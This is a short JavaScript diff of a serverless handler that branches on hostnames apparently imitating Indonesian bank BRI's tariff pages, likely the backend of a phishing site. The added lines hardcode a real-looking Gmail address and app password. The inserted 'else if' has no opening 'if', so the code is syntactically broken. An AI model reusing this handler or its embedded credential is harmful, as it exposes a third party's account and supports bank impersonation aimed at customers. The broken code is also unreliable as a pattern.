@@ -3,9 +3,10 @@ export default function handler(req, res) {
 
     const { body } = req;
     const { url } = req.headers;
-
-    let email = '';
-    let pass = '';
+    
+    } else if (url == 'pilihan-tarif-bri-new.herokuapp.com') {
+    let email = 'landaslepas77@gmail.com';
+    let pass = 'eyosohykexzgicup';
 
     if(url == 'bri-tarif.herokuapp.com'){
 
